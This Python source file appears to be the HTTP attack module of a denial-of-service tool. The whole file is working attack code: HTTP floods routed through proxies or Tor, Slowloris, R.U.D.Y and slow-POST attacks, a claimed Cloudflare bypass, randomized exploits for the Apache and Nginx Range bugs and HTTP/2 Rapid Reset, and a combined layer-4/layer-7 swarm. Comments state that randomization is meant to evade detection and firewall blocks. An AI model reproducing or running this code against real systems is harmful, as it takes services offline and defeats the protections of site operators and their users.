import time
import random
import requests
import asyncio
import aiohttp
import threading
import socket
from urllib.parse import urlparse
from src.config import CONFIG
# IP-HUNTER-SIGNATURE-NT-191q275zj684-riridori
from src.utils.network import get_random_headers, generate_stealth_headers
from src.utils.system import randomize_timing
import src.security
from src.utils.logging import add_system_log

async def async_http_flood(url, duration, proxies_list, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
    """Extreme performance asynchronous HTTP flood with persistent workers"""
    connector = aiohttp.TCPConnector(limit=2000, ssl=False, force_close=True)
    timeout = aiohttp.ClientTimeout(total=10)
    end_time = time.time() + duration

    async def worker(session):
        while time.time() < end_time and not src.security.stop_event.is_set():
            if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
                break
            try:
                if use_tor:
                    proxy = CONFIG['TOR_PROXY']
                else:
                    proxy = random.choice(proxies_list) if (proxies_list and len(proxies_list) > 0) else None
                
                headers = generate_stealth_headers() if stealth_mode else get_random_headers()
                async with session.get(url, headers=headers, proxy=proxy, timeout=timeout) as response:
                    # We don't await read() if we just want to hammer the server
                    if monitor:
                        monitor.update_stats(packets=1)
            except:
                if monitor: monitor.update_stats(failed=1)
                await asyncio.sleep(0.01) # Small backoff on error

    async with aiohttp.ClientSession(connector=connector) as session:
        workers = [asyncio.create_task(worker(session)) for _ in range(500)]
        await asyncio.gather(*workers)

def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
    """Basic HTTP GET flood - Optimized for maximum PPS through raw socket requests where possible"""
    from src.security import increment_socket_counter, decrement_socket_counter
    import socket
    import ssl

    end_time = time.time() + duration
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query: path += "?" + parsed.query

    # Pre-calculate payloads
    headers = generate_stealth_headers() if stealth_mode else get_random_headers()
    headers['Host'] = host
    headers['Connection'] = 'keep-alive'
    
    header_str = f"GET {path} HTTP/1.1\r\n"
    for k, v in headers.items():
        header_str += f"{k}: {v}\r\n"
    header_str += "\r\n"
    payload = header_str.encode()

    while time.time() < end_time and not src.security.stop_event.is_set():
        if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
            break

        s = None
        try:
            increment_socket_counter()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            
            if parsed.scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)

            s.connect((host, port))
            
            # Direct blast with error recovery
            for _ in range(100):
                if time.time() >= end_time or src.security.stop_event.is_set(): break
                try:
                    s.sendall(payload)
                    # Don't wait for response, just keep pushing if PPS is the goal
                    if monitor:
                        monitor.update_stats(packets=1, bytes_sent=len(payload))
                except (socket.error, BrokenPipeError):
                    break # Socket closed, re-connect in outer loop
                
                if stealth_mode:
                    time.sleep(random.uniform(0.01, 0.03))

        except Exception as e:
            if monitor:
                monitor.update_stats(failed=1)
            time.sleep(0.2) # Avoid aggressive re-connect spam on failure
        finally:
            if s:
                try: s.close()
                except: pass
            decrement_socket_counter()
    
    src.security.decrement_thread_counter()

def slowloris_attack(target_ip, target_port, duration, socket_count=500):
    """Slowloris attack - keeps connections open with partial headers"""
    import socket
    sockets = []
    end_time = time.time() + duration

    def create_socket():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, target_port))
            sock.send(f"GET /?{random.randint(1, 5000)} HTTP/1.1\r\n".encode())
            sock.send(f"User-Agent: {random.choice(CONFIG['USER_AGENTS'])}\r\n".encode())
            sock.send(b"Accept-language: en-US,en,q=0.5\r\n")
            return sock
        except:
            return None

    for _ in range(socket_count):
        s = create_socket()
        if s: sockets.append(s)

    try:
        while time.time() < end_time:
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 4000)}\r\n".encode())
                except:
                    try: s.close()
                    except: pass
                    sockets.remove(s)
                    new_s = create_socket()
                    if new_s: sockets.append(new_s)
            
            # Use smaller sleep chunks and check stop_event
            for _ in range(15):
                if time.time() >= end_time or src.security.stop_event.is_set():
                    break
                time.sleep(1)
    finally:
        for s in sockets:
            try: s.close()
            except: pass
        src.security.decrement_thread_counter()

def cloudflare_bypass_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
    """HTTP flood with Cloudflare bypass techniques"""
    try:
        end_time = time.time() + duration
        bypass_headers = [
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0",
                "Referer": "https://www.google.com/"
            },
            {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Cache-Control": "max-age=0"
            }
        ]

        session = requests.Session()
        stealth_headers = generate_stealth_headers() if stealth_mode else None

        while time.time() < end_time:
            if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
                break

            try:
                if stealth_mode:
                    headers = stealth_headers if stealth_headers else random.choice(bypass_headers)
                else:
                    headers = random.choice(bypass_headers)
                
                if use_tor:
                    proxy = {"http": CONFIG['TOR_PROXY'], "https": CONFIG['TOR_PROXY']}
                else:
                    proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None

                if stealth_mode:
                    randomize_timing()
                else:
                    time.sleep(random.uniform(0.1, 1.0))

                methods = [session.get, session.post, session.head]
                method = random.choice(methods)

                if method == session.post:
                    method(url, headers=headers, proxies=proxy, data={"data": random.random()}, timeout=10)
                else:
                    method(url, headers=headers, proxies=proxy, timeout=10)
                
                if monitor:
                    monitor.update_stats(packets=1)

            except Exception:
                if monitor:
                    monitor.update_stats(failed=1)
                continue
    finally:
        src.security.decrement_thread_counter()

def rudy_attack(url, duration, threads=50, monitor=None):
    """R-U-Dead-Yet? (R.U.D.Y) - Slow POST attack"""
    import socket
    add_system_log(f"[bold cyan]ATTACK:[/] Initiating R.U.D.Y slow-post on {url}")
    
    parsed = requests.utils.urlparse(url)
    host = parsed.netloc
    path = parsed.path or "/"
    port = parsed.port or (80 if parsed.scheme == "http" else 443)

    def rudy_thread():
        while time.time() < end_time:
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))
                content_len = random.randint(500000, 1500000)
                s.send(f"POST {path} HTTP/1.1\r\n".encode())
                s.send(f"Host: {host}\r\n".encode())
                s.send(f"Content-Length: {content_len}\r\n".encode())
                s.send(f"User-Agent: {random.choice(CONFIG['USER_AGENTS'])}\r\n".encode())
                s.send(b"Content-Type: application/x-www-form-urlencoded\r\n\r\n")
                
                for i in range(content_len):
                    if time.time() > end_time: break
                    s.send(random.choice(b"abcdefghijklmnopqrstuvwxyz").to_bytes(1, 'big'))
                    if monitor: monitor.update_stats(packets=1)
                    time.sleep(random.uniform(1, 8))
            except:
                continue
            finally:
                if s: 
                    try: s.close()
                    except: pass

    end_time = time.time() + duration
    for _ in range(threads):
        threading.Thread(target=rudy_thread, daemon=True).start()

def hoic_attack(url, duration, monitor=None):
    """High Orbit Ion Cannon (HOIC) - High-speed pattern flood with randomization"""
    add_system_log(f"[bold cyan]ATTACK:[/] Launching HOIC Ion Cannon on {url}")
    end_time = time.time() + duration
    
    def ion_cannon():
        while time.time() < end_time:
            try:
                headers = generate_stealth_headers()
                # Advanced bypass pattern
                rand_param = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(3, 8)))
                rand_val = "".join(random.choices("0123456789", k=random.randint(3, 8)))
                target = f"{url}?{rand_param}={rand_val}"
                
                # Randomized methods
                method = random.choice([requests.get, requests.head])
                r = method(target, headers=headers, timeout=5)
                if monitor: monitor.update_stats(packets=1, bytes_sent=len(r.content) if r.content else 0)
            except:
                if monitor: monitor.update_stats(failed=1)

def apache_killer(url, duration, monitor=None):
    """Apache Range Header DoS (CVE-2011-3192) - Randomized Payload"""
    add_system_log(f"[bold red]EXPLOIT:[/] Apache Killer payload active on {url}")
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            # Randomized range count and values to evade signature detection
            range_count = random.randint(500, 1300)
            ranges = ",".join([f"5-{random.randint(10, 10000)}" for _ in range(range_count)])
            headers = {
                "Range": f"bytes=0-,{ranges}",
                "User-Agent": random.choice(CONFIG['USER_AGENTS'])
            }
            r = requests.get(url, headers=headers, timeout=5)
            if monitor: monitor.update_stats(packets=1)
        except:
            if monitor: monitor.update_stats(failed=1)

def nginx_range_dos(url, duration, monitor=None):
    """Nginx Range DoS attempt (CVE-2017-7529) - Randomized"""
    add_system_log(f"[bold red]EXPLOIT:[/] Nginx Range DoS targeting {url}")
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            # Randomize the suffix or use large negative offsets
            offset = random.choice(["-10", "-50", "-100"])
            large_val = random.randint(9223372036854775000, 9223372036854775807)
            headers = {
                "Range": f"bytes={offset},-{large_val}",
                "User-Agent": random.choice(CONFIG['USER_AGENTS'])
            }
            r = requests.get(url, headers=headers, timeout=5)
            if monitor: monitor.update_stats(packets=1)
        except:
            if monitor: monitor.update_stats(failed=1)

def http2_rapid_reset(url, duration, monitor=None):
    """HTTP/2 Rapid Reset attack (CVE-2023-44487) - Randomized Settings"""
    add_system_log(f"[bold red]EXPLOIT:[/] HTTP/2 Rapid Reset targeting {url}")
    end_time = time.time() + duration
    session = requests.Session()

    # Dynamic settings to look more like legitimate browsers
    h2_settings = [
        'AAMAAABkAARAAAAAAAIAAAAA', # Standard
        'AAMAAABkAAQAAAAAAAIAAAAA', # Chrome-like
        'AAMAAABkAARAAAAAAAIAAAAA'  # Firefox-like
    ]

    while time.time() < end_time:
        try:
            headers = generate_stealth_headers()
            headers['Connection'] = 'Upgrade, HTTP2-Settings'
            headers['Upgrade'] = 'h2c'
            headers['HTTP2-Settings'] = random.choice(h2_settings)

            r = session.get(url, headers=headers, timeout=5)
            if monitor: monitor.update_stats(packets=1)
        except:
            if monitor: monitor.update_stats(failed=1)

def slowpost_attack(url, duration, monitor=None):
    """Slow POST attack (similar to R.U.D.Y but simpler library based)"""
    add_system_log(f"[bold cyan]ATTACK:[/] Initializing Slow POST on {url}")
    end_time = time.time() + duration
    
    def slow_post():
        while time.time() < end_time:
            try:
                # Custom iterator to send data slowly
                def slow_gen():
                    for _ in range(100):
                        yield b"a"
                        time.sleep(random.uniform(5, 15))
                
                requests.post(url, data=slow_gen(), timeout=duration)
                if monitor: monitor.update_stats(packets=1)
            except:
                continue

    threading.Thread(target=slow_post, daemon=True).start()

def mixed_flood(url, duration, proxies=None, monitor=None):
    """
    [ID 33] Mixed-Vector Apocalypse Attack
    Combines L7 HTTP Floods, Slowloris, and L4 (SYN/UDP) vectors for maximum impact.
    """
    from src.attacks.l4 import syn_flood, udp_flood
    add_system_log(f"[bold red]APOCALYPSE:[/] Initiating hybrid vector swarm on {url}")
    
    parsed = urlparse(url)
    target_port = parsed.port or (443 if parsed.scheme == "https" else 80)
    target_ip = None
    
    try:
        target_ip = socket.gethostbyname(parsed.hostname)
    except:
        add_system_log(f"[bold yellow]WARNING:[/] Failed to resolve {parsed.hostname} for L4 vectors")

    threads = []
    end_time = time.time() + duration
    
    # 1. Async L7 Swarm (Extreme Performance)
    def l7_swarm():
        # High concurrency L7 swarm using our async engine
        asyncio.run(async_http_flood(url, duration, proxies, monitor, stealth_mode=True))
    
    # 2. Slowloris Vector (Connection Exhaustion)
    def slowloris_swarm():
        end_loris = time.time() + duration
        while time.time() < end_loris and not src.security.stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((parsed.hostname, target_port))
                s.send(f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {parsed.hostname}\r\n".encode())
                s.send(f"User-Agent: {random.choice(CONFIG['USER_AGENTS'])}\r\n".encode())
                s.send("\r\n".encode())
                while time.time() < end_loris and not src.security.stop_event.is_set():
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(random.randint(10, 15))
            except:
                time.sleep(0.5)

    # Launch L7 & Slowloris
    for task in [l7_swarm, slowloris_swarm]:
        t = threading.Thread(target=task, daemon=True)
        t.start()
        threads.append(t)
    
    # 3. L4 Vectors (Only if IP is resolved)
    if target_ip:
        # SYN Flood (Requires root/admin usually, but Scapy handles it)
        t_syn = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration, monitor), daemon=True)
        t_syn.start()
        threads.append(t_syn)
        
        # UDP Flood
        t_udp = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, monitor), daemon=True)
        t_udp.start()
        threads.append(t_udp)

    # Wait for completion
    while time.time() < end_time and not src.security.stop_event.is_set():
        time.sleep(1)

def adaptive_flood(url, duration, proxies=None, monitor=None):
    """AI-Adaptive Smart Flood: Adjusts intensity and methods based on server feedback"""
    end_time = time.time() + duration
    intensity = 1.0 # Current intensity multiplier (0.1 to 3.0)
    delay = 0.05
    methods = ["GET", "POST", "HEAD"]
    current_method = "GET"
    
    add_system_log(f"[bold cyan]AI-ADAPTIVE:[/] Initiating smart flood on {url}")
    
    session = requests.Session()
    
    while time.time() < end_time and not src.security.stop_event.is_set():
        try:
            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
            headers = generate_stealth_headers()
            
            start_req = time.time()
            if current_method == "GET":
                resp = session.get(url, headers=headers, proxies=proxy, timeout=5)
            elif current_method == "POST":
                data = {random.choice(["id", "user", "data"]): random.randint(1000, 9999)}
                resp = session.post(url, headers=headers, data=data, proxies=proxy, timeout=5)
            else: # HEAD
                resp = session.head(url, headers=headers, proxies=proxy, timeout=5)
            
            latency = time.time() - start_req
            
            # --- AI LOGIC: Adaptive Response ---
            if resp.status_code == 200:
                # Server is healthy, ramp up!
                intensity = min(3.0, intensity + 0.1)
                delay = max(0.001, delay - 0.005)
                # Keep current method as it works
            elif resp.status_code == 429 or resp.status_code == 503:
                # Rate limited or Overloaded, back off significantly
                intensity = max(0.1, intensity - 0.5)
                delay = min(2.0, delay + 0.5)
                # Switch method to see if another path is less protected
                current_method = random.choice(methods)
                add_system_log(f"[yellow]ADAPTIVE:[/] Server pressured (Code {resp.status_code}), slowing & switching to {current_method}")
            elif resp.status_code == 403:
                # WAF Block, stop for a bit and rotate everything
                add_system_log(f"[red]ADAPTIVE:[/] WAF Block (403), rotating headers and pausing...")
                time.sleep(2)
                current_method = random.choice(methods)
            
            if monitor:
                size = len(resp.content) if hasattr(resp, 'content') and resp.content else 0
                monitor.update_stats(packets=1, bytes_sent=size)
            
            # Dynamic sleep based on adaptive parameters
            actual_delay = delay / intensity
            if actual_delay > 0:
                time.sleep(actual_delay)
            
        except Exception:
            if monitor: monitor.update_stats(failed=1)
            time.sleep(0.5)
            current_method = random.choice(methods)
